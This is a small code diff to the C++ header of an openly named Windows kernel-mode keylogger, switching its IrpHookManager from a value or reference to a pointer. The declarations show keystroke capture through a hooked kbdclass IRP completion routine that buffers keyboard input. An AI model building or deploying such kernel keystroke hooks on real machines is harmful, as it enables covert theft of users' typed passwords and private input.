@@ -48,7 +48,7 @@ typedef struct _KEYBOARD_INPUT_DATA {
 
 class Keylogger {
 public:
-	Keylogger(IrpHookManager& HookManager, ULONG BufferSize = 0x1000);
+	Keylogger(IrpHookManager* HookManager, ULONG BufferSize = 0x1000);
 
 	VOID StartLogging();
 
@@ -61,7 +61,7 @@ private:
 
 	friend NTSTATUS HookedKbdclassCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
 private:
-	IrpHookManager hookManager;
+	IrpHookManager* hookManager;
 	Vector<KEYBOARD_INPUT_DATA> buffer;
 	ULONG offsetInBuffer;
 	Mutex bufferLock;
